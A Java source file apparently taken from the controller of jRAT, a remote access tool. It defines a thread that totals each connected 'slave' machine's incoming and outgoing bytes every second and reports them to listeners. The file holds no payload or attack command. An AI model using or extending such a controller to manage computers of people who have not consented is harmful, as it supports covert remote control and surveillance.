package se.jrat.client.threads;

import java.util.ArrayList;
import java.util.List;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Main;
import se.jrat.client.listeners.GlobalNetworkMonitorListener;
import se.jrat.client.listeners.NetworkMonitorListener;

public class RunnableNetworkCounter implements Runnable {
	
	private static final List<NetworkMonitorListener> INVIDUAL_LISTENERS = new ArrayList<NetworkMonitorListener>();
	private static final List<GlobalNetworkMonitorListener> GLOBAL_LISTENERS = new ArrayList<GlobalNetworkMonitorListener>();
	
	@Override
	public void run() {
		try {
			while (true) {
				Thread.sleep(1000L);

				int in = 0;
				int out = 0;
				
				for (AbstractSlave slave : Main.connections) {
					int sin = (int) slave.getCountingInputStream().getCount();
					int sout = (int) slave.getCountingOutputStream().getCount();
					in += sin;
					out += sout;
					
					for (NetworkMonitorListener listener : INVIDUAL_LISTENERS) {
						listener.onUpdate(slave, sin, sout);
					}
				}
				
				for (GlobalNetworkMonitorListener listener : GLOBAL_LISTENERS) {
					listener.onUpdate(in, out);
				}
							
				for (AbstractSlave slave : Main.connections) {
					slave.getCountingInputStream().reset();
					slave.getCountingOutputStream().reset();
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public static void addGlobalListener(GlobalNetworkMonitorListener listener) {
		GLOBAL_LISTENERS.add(listener);
	}
	
	public static void removeGlobalListener(GlobalNetworkMonitorListener listener) {
		GLOBAL_LISTENERS.remove(listener);
	}

	public static void addListener(NetworkMonitorListener listener) {
		INVIDUAL_LISTENERS.add(listener);
	}
	
	public static void removeListener(NetworkMonitorListener listener) {
		INVIDUAL_LISTENERS.remove(listener);
	}
}

